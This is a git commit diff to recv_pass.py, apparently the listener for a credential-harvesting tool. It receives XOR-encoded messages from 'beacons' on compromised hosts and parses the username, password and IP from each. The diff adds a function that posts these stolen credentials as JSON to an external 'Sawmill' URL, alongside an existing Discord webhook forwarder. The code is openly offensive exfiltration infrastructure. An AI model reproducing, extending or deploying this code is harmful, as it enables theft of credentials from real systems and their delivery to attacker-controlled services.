60077b965eb0926fac6b36e4ee7ad27f831efb23
P0nt14c <jason.howe223@gmail.com>
2022-10-13 19:08:57 -0400

    update retriever to ship creds to sawmill

--- recv_pass.py
+++ recv_pass.py
@@ -2,6 +2,7 @@
 from errno import ENXIO
 import socket
 import base64
+import json
 import threading
 import requests
 import os
@@ -12,6 +13,7 @@ load_dotenv()
 url=os.getenv("WEBHOOK")
 key=os.getenv("XOR_KEY", "bingus")
 port=os.getenv("PORT",8000)
+sawmill_url=os.getenv("SAWMILLURL")
 
 # From GeeksForGeeks <3
 def xor_decrypt(inpString):
@@ -53,6 +55,33 @@ def fwd_discord(msg):
     else:
         print("Payload delivered successfully, code {}.".format(result.status_code))
 
+
+def fwd_sawmill(msg):
+    # Format the string
+    split_msg = msg.strip(" ") 
+    split_msg = msg.split(":")
+    split_msg[2] = split_msg[2].strip("\n")
+    # 2 is IP, 0 is username, 1 is password
+    ip = split_msg[2]
+    user = split_msg[0]
+    pwd = split_msg[1]
+
+    data = {}
+    data["ip"] = ip
+    data["credentials"] = user + ":" + pwd
+
+    payload = json.dumps(data)
+     # Send and check result
+    try:
+        result = requests.post(sawmill_url, json = payload)
+        result.raise_for_status()
+    except requests.exceptions.HTTPError as err:
+        print(err)
+    except requests.exceptions.MissingSchema as nourl:
+        print("No Sawmill_URL provided : Skipping Webhook")
+    else:
+        print("Payload delivered successfully, code {}.".format(result.status_code))
+
 # Handle the sockets coming from the beacons
 def handle(client_sock, addr):
     # Read the message
@@ -64,6 +93,9 @@ def handle(client_sock, addr):
     
     # Send to Discord
     fwd_discord(msg)
+
+    #send to Sawmill
+    fwd_sawmill(msg)
     return()
 
 
@@ -74,7 +106,7 @@ def main():
 
     # Create Socket & Listen
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_sock.bind(("", port))
+    server_sock.bind(("", int(port)))
     server_sock.listen()
     print(f"Server Is Listening\n    Key : {key}")
 
